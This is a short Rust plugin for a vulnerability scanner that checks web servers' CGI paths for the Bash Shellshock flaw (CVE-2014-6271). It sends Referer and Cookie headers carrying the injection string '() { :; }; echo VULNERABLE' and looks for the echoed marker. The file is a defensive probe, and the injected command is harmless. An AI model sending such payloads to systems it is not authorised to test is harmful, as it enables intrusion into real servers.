/* http-shellshock - Bash CGI Shellshock (CVE-2014-6271) probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.cgi",
        "/cgi-sys/defaultwebpage.cgi", "/",
    ];
    let extra = "Referer: () { :; }; echo VULNERABLE\r\nCookie: () { :; }; echo VULNERABLE\r\n";
    if !valid(ctx) { return 1; }
    for path in paths.iter() {
        let resp = match http_request(ctx, "GET", path, None, extra, "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if resp.contains("VULNERABLE") {
            set_out(ctx, &format!("VULNERABLE: Shellshock CVE-2014-6271 at {}", path));
            return 0;
        }
    }
    set_out(ctx, "not vulnerable: Shellshock CVE-2014-6271 not confirmed");
    0
}
